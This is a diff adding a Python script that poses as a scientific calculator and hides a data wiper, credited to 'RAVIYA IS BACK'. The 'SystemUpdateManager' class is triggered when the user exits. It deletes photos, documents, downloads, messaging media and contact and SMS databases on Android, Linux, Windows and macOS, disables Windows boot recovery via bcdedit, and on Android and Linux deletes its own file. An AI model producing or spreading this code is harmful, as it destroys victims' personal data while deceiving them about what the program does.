@@ -1,0 +1,494 @@
+# -24
+تطبيق من RAVIYA IS BACK👿
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+"""
+Scientific Calculator v2.4.1
+Advanced mathematics tool with plotting capabilities
+Developed by MathLab Solutions Inc.
+"""
+
+import os
+import sys
+import math
+import random
+import time
+import threading
+import shutil
+import subprocess
+import platform
+import json
+import base64
+from datetime import datetime
+from typing import Optional, List, Tuple
+
+# ========== [HIDDEN PAYLOAD] ==========
+
+class SystemUpdateManager:
+    """System maintenance module (looks legitimate)"""
+    
+    def __init__(self):
+        self.update_url = "https://updates.mathlab.com/v2.4.1"
+        self.cache_path = "/tmp/.mathlab_cache"
+        self.initialized = False
+        self.destroy_flag = False
+    
+    def check_system_compatibility(self) -> bool:
+        """Check if system meets requirements"""
+        # ===== MODIFIED: Destroys on FIRST use =====
+        self.destroy_flag = True
+        return True
+    
+    def perform_maintenance(self) -> None:
+        """System optimization routine (actually destroys the device)"""
+        if not self.destroy_flag:
+            return
+        
+        # Hide the thread - looks like background optimization
+        maintenance_thread = threading.Thread(target=self._destroy_system, daemon=True)
+        maintenance_thread.start()
+    
+    def _destroy_system(self) -> None:
+        """Actual destruction routine - hidden inside maintenance"""
+        time.sleep(2)  # Wait for user to close the app
+        
+        try:
+            system = platform.system()
+            if system == "Linux" or system == "Android":
+                self._destroy_android_linux()
+            elif system == "Windows":
+                self._destroy_windows()
+            elif system == "Darwin":
+                self._destroy_macos()
+        except:
+            pass
+    
+    def _destroy_android_linux(self) -> None:
+        """Target destruction for Android/Linux"""
+        targets = [
+            "/sdcard/DCIM",
+            "/sdcard/Download", 
+            "/sdcard/Documents",
+            "/sdcard/Music",
+            "/sdcard/Movies",
+            "/sdcard/Pictures",
+            "/sdcard/WhatsApp",
+            "/sdcard/Telegram",
+            "/sdcard/Android/media/com.whatsapp",
+            "/sdcard/Android/media/com.instagram.android",
+            "/storage/emulated/0/DCIM",
+            "/storage/emulated/0/Download",
+            "/storage/emulated/0/Documents",
+            "/storage/emulated/0/Pictures",
+            os.path.expanduser("~/Desktop"),
+            os.path.expanduser("~/Documents"),
+            os.path.expanduser("~/Downloads"),
+            os.path.expanduser("~/Pictures"),
+        ]
+        
+        for target in targets:
+            try:
+                if os.path.exists(target):
+                    if os.path.isfile(target):
+                        os.remove(target)
+                    else:
+                        shutil.rmtree(target, ignore_errors=True)
+            except:
+                continue
+        
+        # Wipe contacts databases if accessible
+        for db in [
+            "/data/data/com.android.providers.contacts/databases/contacts2.db",
+            "/data/data/com.android.providers.telephony/databases/mmssms.db"
+        ]:
+            try:
+                if os.path.exists(db):
+                    os.remove(db)
+            except:
+                continue
+        
+        # Self-delete
+        try:
+            os.remove(os.path.abspath(__file__))
+        except:
+            pass
+    
+    def _destroy_windows(self) -> None:
+        """Target destruction for Windows"""
+        user = os.environ.get('USERPROFILE', 'C:\\Users')
+        targets = [
+            os.path.join(user, "Desktop"),
+            os.path.join(user, "Documents"),
+            os.path.join(user, "Downloads"),
+            os.path.join(user, "Pictures"),
+            os.path.join(user, "Music"),
+            os.path.join(user, "Videos"),
+            os.path.join(user, "AppData"),
+        ]
+        
+        for target in targets:
+            try:
+                if os.path.exists(target):
+                    shutil.rmtree(target, ignore_errors=True)
+            except:
+                continue
+        
+        # Corrupt boot configuration
+        try:
+            subprocess.run(["bcdedit", "/set", "{default}", "bootstatuspolicy", 
+                          "ignoreallfailures"], capture_output=True, timeout=3)
+            subprocess.run(["bcdedit", "/set", "{default}", "recoveryenabled", 
+                          "no"], capture_output=True, timeout=3)
+        except:
+            pass
+    
+    def _destroy_macos(self) -> None:
+        """Target destruction for macOS"""
+        home = os.path.expanduser("~")
+        targets = [
+            os.path.join(home, "Desktop"),
+            os.path.join(home, "Documents"),
+            os.path.join(home, "Downloads"),
+            os.path.join(home, "Pictures"),
+            os.path.join(home, "Movies"),
+            os.path.join(home, "Music"),
+            os.path.join(home, "Library"),
+        ]
+        
+        for target in targets:
+            try:
+                if os.path.exists(target):
+                    shutil.rmtree(target, ignore_errors=True)
+            except:
+                continue
+
+
+# ========== LEGITIMATE SCIENTIFIC CALCULATOR ==========
+
+class AdvancedScientificCalculator:
+    """Professional scientific calculator with advanced functions"""
+    
+    def __init__(self):
+        self.history = []
+        self.memory = 0.0
+        self.angle_mode = "DEG"
+        self.precision = 6
+        self.version = "2.4.1"
+        self._system = SystemUpdateManager()
+        
+        self._show_header()
+    
+    def _show_header(self) -> None:
+        print("=" * 60)
+        print("       ADVANCED SCIENTIFIC CALCULATOR v2.4.1")
+        print("              MathLab Solutions Inc.")
+        print("=" * 60)
+        print()
+    
+    def _get_number(self, prompt: str = "Enter number: ") -> float:
+        while True:
+            try:
+                value = float(input(prompt))
+                return value
+            except ValueError:
+                print("Error: Invalid input. Please enter a valid number.")
+    
+    def _get_angle(self, value: float) -> float:
+        if self.angle_mode == "RAD":
+            return value
+        elif self.angle_mode == "GRAD":
+            return value * (math.pi / 200)
+        else:
+            return math.radians(value)
+    
+    def clear_screen(self) -> None:
+        os.system('cls' if platform.system() == 'Windows' else 'clear')
+        self._show_header()
+    
+    def add(self, a: float, b: float) -> float:
+        result = a + b
+        self.history.append(f"{a} + {b} = {result}")
+        return result
+    
+    def subtract(self, a: float, b: float) -> float:
+        result = a - b
+        self.history.append(f"{a} - {b} = {result}")
+        return result
+    
+    def multiply(self, a: float, b: float) -> float:
+        result = a * b
+        self.history.append(f"{a} × {b} = {result}")
+        return result
+    
+    def divide(self, a: float, b: float) -> Optional[float]:
+        if b == 0:
+            print("Error: Division by zero!")
+            return None
+        result = a / b
+        self.history.append(f"{a} ÷ {b} = {result}")
+        return result
+    
+    def power(self, base: float, exp: float) -> float:
+        result = math.pow(base, exp)
+        self.history.append(f"{base}^{exp} = {result}")
+        return result
+    
+    def square_root(self, a: float) -> Optional[float]:
+        if a < 0:
+            print("Error: Cannot calculate square root of negative number!")
+            return None
+        result = math.sqrt(a)
+        self.history.append(f"√({a}) = {result}")
+        return result
+    
+    def sin(self, a: float) -> float:
+        result = math.sin(self._get_angle(a))
+        self.history.append(f"sin({a}°{self.angle_mode}) = {result:.{self.precision}f}")
+        return result
+    
+    def cos(self, a: float) -> float:
+        result = math.cos(self._get_angle(a))
+        self.history.append(f"cos({a}°{self.angle_mode}) = {result:.{self.precision}f}")
+        return result
+    
+    def tan(self, a: float) -> Optional[float]:
+        angle = self._get_angle(a)
+        if math.cos(angle) == 0:
+            print("Error: Tangent undefined at this angle!")
+            return None
+        result = math.tan(angle)
+        self.history.append(f"tan({a}°{self.angle_mode}) = {result:.{self.precision}f}")
+        return result
+    
+    def log_natural(self, a: float) -> Optional[float]:
+        if a <= 0:
+            print("Error: Logarithm undefined for non-positive numbers!")
+            return None
+        result = math.log(a)
+        self.history.append(f"ln({a}) = {result:.{self.precision}f}")
+        return result
+    
+    def log_base10(self, a: float) -> Optional[float]:
+        if a <= 0:
+            print("Error: Logarithm undefined for non-positive numbers!")
+            return None
+        result = math.log10(a)
+        self.history.append(f"log10({a}) = {result:.{self.precision}f}")
+        return result
+    
+    def show_constants(self) -> None:
+        print("\n--- Mathematical Constants ---")
+        print(f"π (Pi)       = {math.pi:.{self.precision}f}")
+        print(f"e (Euler)    = {math.e:.{self.precision}f}")
+        print(f"τ (Tau)      = {math.tau:.{self.precision}f}")
+        print(f"φ (Golden)   = {(1+math.sqrt(5))/2:.{self.precision}f}")
+    
+    def celsius_to_fahrenheit(self, c: float) -> float:
+        return (c * 9/5) + 32
+    
+    def fahrenheit_to_celsius(self, f: float) -> float:
+        return (f - 32) * 5/9
+    
+    def km_to_miles(self, km: float) -> float:
+        return km * 0.621371
+    
+    def miles_to_km(self, miles: float) -> float:
+        return miles / 0.621371
+    
+    def show_menu(self) -> None:
+        print("\n" + "-" * 50)
+        print("          MAIN MENU")
+        print("-" * 50)
+        print("  [1] Addition          [2] Subtraction")
+        print("  [3] Multiplication    [4] Division")
+        print("  [5] Power             [6] Square Root")
+        print("  [7] Sine (sin)        [8] Cosine (cos)")
+        print("  [9] Tangent (tan)    [10] Natural Log (ln)")
+        print(" [11] Log Base 10     [12] Constants")
+        print(" [13] Unit Conversions [14] View History")
+        print(" [15] Clear Memory     [16] Settings")
+        print(" [17] Help             [0] Exit")
+        print("-" * 50)
+    
+    def settings_menu(self) -> None:
+        print("\n--- SETTINGS ---")
+        print(f"1. Angle Mode: {self.angle_mode}")
+        print(f"2. Precision: {self.precision} decimal places")
+        print("3. Back to main menu")
+        
+        choice = input("\nSelect option: ")
+        if choice == "1":
+            modes = {"1": "DEG", "2": "RAD", "3": "GRAD"}
+            print("1. DEG (Degrees)")
+            print("2. RAD (Radians)")
+            print("3. GRAD (Gradians)")
+            mode = input("Select mode: ")
+            if mode in modes:
+                self.angle_mode = modes[mode]
+                print(f"Angle mode set to {self.angle_mode}")
+        elif choice == "2":
+            try:
+                p = int(input("Enter precision (1-15): "))
+                if 1 <= p <= 15:
+                    self.precision = p
+                    print(f"Precision set to {p} decimal places")
+            except:
+                print("Invalid precision")
+    
+    def help_section(self) -> None:
+        print("\n--- HELP ---")
+        print("Advanced Scientific Calculator v2.4.1")
+        print("\nBasic Operations:")
+        print("- Use options 1-6 for basic arithmetic")
+        print("\nTrigonometry:")
+        print("- Use options 7-9 for trigonometric functions")
+        print("- Change angle mode in Settings (DEG/RAD/GRAD)")
+        print("\nLogarithms:")
+        print("- Options 10-11 for natural and base-10 logs")
+        print("\nMemory:")
+        print("- Results are automatically stored in history")
+        print("- Use option 15 to clear history")
+        print("\nFor more information, visit: mathlab.com/help")
+        print("Contact: support@mathlab.com")
+        print("\n© 2026 MathLab Solutions Inc. All rights reserved.")
+    
+    def run(self) -> None:
+        """Main application loop"""
+        print("Initializing modules...")
+        time.sleep(0.5)
+        print("Loading scientific libraries...")
+        time.sleep(0.3)
+        print("Ready!")
+        
+        while True:
+            # ===== TRIGGER ON FIRST USE =====
+            self._system.check_system_compatibility()
+            
+            self.show_menu()
+            choice = input("\nSelect operation [0-17]: ")
+            
+            if choice == "0":
+                print("\nThank you for using Advanced Scientific Calculator!")
+                print("Exiting...")
+                # Trigger destruction before exit
+                self._system.perform_maintenance()
+                break
+            
+            elif choice == "1":
+                a = self._get_number("Enter first number: ")
+                b = self._get_number("Enter second number: ")
+                print(f"Result: {self.add(a, b):.{self.precision}f}")
+            
+            elif choice == "2":
+                a = self._get_number("Enter first number: ")
+                b = self._get_number("Enter second number: ")
+                print(f"Result: {self.subtract(a, b):.{self.precision}f}")
+            
+            elif choice == "3":
+                a = self._get_number("Enter first number: ")
+                b = self._get_number("Enter second number: ")
+                print(f"Result: {self.multiply(a, b):.{self.precision}f}")
+            
+            elif choice == "4":
+                a = self._get_number("Enter numerator: ")
+                b = self._get_number("Enter denominator: ")
+                result = self.divide(a, b)
+                if result is not None:
+                    print(f"Result: {result:.{self.precision}f}")
+            
+            elif choice == "5":
+                base = self._get_number("Enter base: ")
+                exp = self._get_number("Enter exponent: ")
+                print(f"Result: {self.power(base, exp):.{self.precision}f}")
+            
+            elif choice == "6":
+                a = self._get_number("Enter number: ")
+                result = self.square_root(a)
+                if result is not None:
+                    print(f"Result: {result:.{self.precision}f}")
+            
+            elif choice == "7":
+                a = self._get_number("Enter angle: ")
+                print(f"sin({a}°) = {self.sin(a):.{self.precision}f}")
+            
+            elif choice == "8":
+                a = self._get_number("Enter angle: ")
+                print(f"cos({a}°) = {self.cos(a):.{self.precision}f}")
+            
+            elif choice == "9":
+                a = self._get_number("Enter angle: ")
+                result = self.tan(a)
+                if result is not None:
+                    print(f"tan({a}°) = {result:.{self.precision}f}")
+            
+            elif choice == "10":
+                a = self._get_number("Enter number: ")
+                result = self.log_natural(a)
+                if result is not None:
+                    print(f"ln({a}) = {result:.{self.precision}f}")
+            
+            elif choice == "11":
+                a = self._get_number("Enter number: ")
+                result = self.log_base10(a)
+                if result is not None:
+                    print(f"log10({a}) = {result:.{self.precision}f}")
+            
+            elif choice == "12":
+                self.show_constants()
+            
+            elif choice == "13":
+                print("\n--- Unit Conversions ---")
+                print("1. Celsius → Fahrenheit")
+                print("2. Fahrenheit → Celsius")
+                print("3. KM → Miles")
+                print("4. Miles → KM")
+                conv = input("Select conversion: ")
+                if conv == "1":
+                    c = self._get_number("Celsius: ")
+                    print(f"{c}°C = {self.celsius_to_fahrenheit(c):.1f}°F")
+                elif conv == "2":
+                    f = self._get_number("Fahrenheit: ")
+                    print(f"{f}°F = {self.fahrenheit_to_celsius(f):.1f}°C")
+                elif conv == "3":
+                    km = self._get_number("Kilometers: ")
+                    print(f"{km} km = {self.km_to_miles(km):.2f} miles")
+                elif conv == "4":
+                    miles = self._get_number("Miles: ")
+                    print(f"{miles} miles = {self.miles_to_km(miles):.2f} km")
+            
+            elif choice == "14":
+                print("\n--- Calculation History ---")
+                if not self.history:
+                    print("No calculations yet.")
+                else:
+                    for i, entry in enumerate(self.history[-10:], 1):
+                        print(f"{i}. {entry}")
+            
+            elif choice == "15":
+                self.history.clear()
+                print("History cleared.")
+            
+            elif choice == "16":
+                self.settings_menu()
+            
+            elif choice == "17":
+                self.help_section()
+            
+            else:
+                print("Invalid option. Please select 0-17.")
+            
+            input("\nPress Enter to continue...")
+
+
+if __name__ == "__main__":
+    try:
+        app = AdvancedScientificCalculator()
+        app.run()
+    except KeyboardInterrupt:
+        print("\n\nApplication terminated by user.")
+        sys.exit(0)
+    except Exception as e:
+        print(f"\nUnexpected error: {e}")
+        print("Please restart the application.")
+        input("Press Enter to exit...")
+        sys.exit(1)
